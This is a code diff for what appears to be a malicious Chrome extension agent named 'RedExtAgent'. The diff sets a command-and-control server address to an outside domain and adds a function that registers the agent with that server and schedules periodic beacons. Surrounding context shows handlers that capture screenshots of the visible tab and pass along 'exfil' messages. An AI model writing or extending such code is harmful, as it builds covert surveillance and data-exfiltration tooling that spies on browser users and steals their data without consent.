@@ -27,8 +27,7 @@ window.run = function(cfg) {
       console.error("[Target] Fetch error during registration:", err);
     });
 };
-
-  const C2_SERVER = ''; // Update if needed
+  const C2_SERVER = 'https://mydomain.com'; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -307,6 +306,28 @@ async function beaconToC2() {
     console.error('[Beacon Error]', err.message);
   }
 }
+// Register agent
+async function registerAgent() {
+  console.log('[RegisterAgent] Starting');
+  try {
+    const response = await fetchWithRetry(`${C2_SERVER}/session/new`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ agent_name: 'RedExtAgent' })
+    });
+    const data = await response.json();
+    agent_id = data.agent_id;
+    console.log(`[RegisterAgent] Received agent_id: ${agent_id}`);
+
+    chrome.storage.local.set({ agent_id }, () => {
+      console.log('[RegisterAgent] Stored agent_id, scheduling beacon');
+      scheduleNextBeacon();
+    });
+  } catch (err) {
+    console.error('[RegisterAgent Error]', err.message);
+  }
+}
+
   // Handle our custom screenshot capture request
   if (message.type === 'capture_screenshot') {
     chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
@@ -325,6 +346,7 @@ async function beaconToC2() {
       });
     });
   }
+
   // Handle other exfil messages
   if (message.type === 'exfil') {
     console.log('[Exfil Message]', message.data);
@@ -335,5 +357,6 @@ async function beaconToC2() {
     });
     sendResponse({ status: 'ok' });
   }
+
   return true;
 });
